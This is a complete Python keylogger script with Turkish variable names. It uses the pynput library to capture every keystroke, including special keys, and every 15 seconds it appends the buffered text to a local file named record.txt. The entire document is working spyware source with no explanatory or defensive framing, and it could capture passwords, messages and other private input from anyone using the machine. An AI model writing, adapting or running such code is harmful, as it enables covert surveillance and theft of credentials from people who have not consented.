import pynput.keyboard
import threading
toplama = ""
def emir(harfler):
    global toplama
    try:
        toplama+=str(harfler.char)
    except AttributeError:
        if harfler==harfler.space:
            toplama+=" "
        elif harfler==harfler.backspace:
            sayi=len(toplama)-1
            deger=0
            sonuc=""
            while sayi>deger:
                sonuc +=toplama[deger]
                deger+=1
            toplama=sonuc
        elif harfler==harfler.enter:
            toplama+="\n"
        else:
            toplama+=str("["+str(harfler)+"]")

dinleme=pynput.keyboard.Listener(on_press=emir)
def dosyayaYaz(mesaj):
    global toplama
    with open("record.txt","a") as file:
        file.write(mesaj)

def dallanma():
    global toplama
    if toplama:
        dosyayaYaz(toplama)
        toplama=""
    timer=threading.Timer(15,dallanma)
    timer.start()


with dinleme:
    dallanma()
    dinleme.join()
